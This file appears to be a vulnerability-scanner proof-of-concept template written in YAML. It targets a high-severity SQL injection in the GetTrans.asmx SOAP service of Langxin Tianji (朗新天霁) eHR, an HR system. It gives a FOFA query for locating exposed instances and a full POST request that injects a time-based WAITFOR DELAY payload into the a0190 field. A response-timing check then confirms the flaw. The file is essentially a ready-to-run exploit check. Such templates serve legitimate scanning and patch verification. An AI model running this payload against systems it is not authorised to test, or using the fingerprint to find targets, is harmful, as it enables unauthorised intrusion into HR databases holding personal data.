id: poc-yaml-hrsoft-e-hr-gettrans-asmx-sqli
info:
  name: 朗新天霁eHR GetTrans.asmx SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: 朗新天霁人力资源管理系统
  fofa: body="/default.aspx?ReturnUrl=%2f" && body="silverlight"
variables:
  t1: random_int(4,9)
  t2: t1 + 3
requests:
- method: POST
  path: /ws/GetTrans.asmx
  headers:
    Content-Type: text/xml; charset=utf-8
    SOAPAction: http://tempuri.org/GetWorkListInfo
  data: "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\
    \ xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"\
    >\n  <soap:Body>\n    <GetWorkListInfo xmlns=\"http://tempuri.org/\">\n      <a0190>1';WAITFOR\
    \ DELAY '0:0:{{.t1}}'--</a0190>\n    </GetWorkListInfo>\n  </soap:Body>\n</soap:Envelope>"
  expression: "status_code == 200 && \ncontains(body,\"GetWorkListInfoResult\") &&\n\
    contains(body,\"GetWorkListInfoResponse\") &&\ncontains(content_type,\"text/xml\"\
    ) &&\nduration > t1 &&\nduration < t2\n"
transport: http
